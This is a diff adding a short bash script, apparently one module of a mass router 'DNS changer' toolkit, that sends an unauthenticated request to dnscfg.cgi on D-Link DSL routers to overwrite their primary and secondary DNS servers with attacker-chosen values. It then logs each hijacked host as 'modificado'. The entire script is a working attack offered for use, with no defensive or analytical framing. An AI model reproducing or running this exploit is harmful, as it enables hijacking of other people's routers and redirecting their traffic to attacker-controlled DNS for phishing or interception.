@@ -1,0 +1,13 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+###########################
+
+${CURL} -f "http://$HOSTNAME/dnscfg.cgi?dnsPrimary=${DNS1}&dnsSecondary=${DNS2}&dnsDynamic=0&dnsRefresh=0" 1>/dev/null 2>/dev/null
+echo "[+] modificado, http://$HOSTNAME not:found [D-LINK DSL-BUG]"
+echo "http://$HOSTNAME (not:found => unchanged) [D-LINK DSL-BUG]" >> logs/modificados_BUG.log
